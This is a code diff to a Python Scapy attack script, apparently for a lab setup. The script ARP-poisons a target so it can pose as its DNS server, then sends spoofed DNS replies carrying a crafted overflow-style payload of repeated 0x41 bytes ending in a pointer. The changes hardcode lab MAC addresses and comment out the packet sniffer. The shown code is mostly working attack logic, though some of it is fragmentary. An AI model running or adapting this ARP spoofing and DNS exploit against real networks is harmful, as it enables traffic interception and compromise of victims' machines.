@@ -11,8 +11,10 @@ def device_setup():
 
 def ARPP(target, dns_server):
     print("[*] Sending poisoned ARP packets")
-    target_mac = getmacbyip(target)
-    dns_server_mac = getmacbyip(dns_server)
+    target_mac = "02:42:ac:14:00:04"
+    dns_server_mac = "02:42:ac:14:00:32"
+    #target_mac = getmacbyip(target)
+    #dns_server_mac = getmacbyip(dns_server)
     while True:
         time.sleep(2)
         send(ARP(op=2, pdst=target, psrc=dns_server, hwdst=target_mac),verbose = 0)
@@ -20,7 +22,7 @@ def ARPP(target, dns_server):
 
 def exploit(target):
     print("[*] Listening ")
-    sniff (filter="udp and port 53 and host " + target, prn = process_received_packet)
+    #sniff (filter="udp" + target, prn = process_received_packet)
 
 """
 RFC schema
@@ -40,7 +42,7 @@ RFC schema
 |               AR              |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
-Fig. DNS                             
+Fig. DNS
 
 """
 def process_received_packet(received_packet):
@@ -66,7 +68,7 @@ def process_received_packet(received_packet):
                         b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
                         b"\x41\x41\x41\x41\x41\x41\x41\xC0\x04"
                     ]
-                    
+
                     payload = b"".join(payload)
                     spoofed_pkt = (Ether()/IP(dst=received_packet[IP].src, src=received_packet[IP].dst)/\
                         UDP(dport=received_packet[UDP].sport, sport=received_packet[UDP].dport)/\
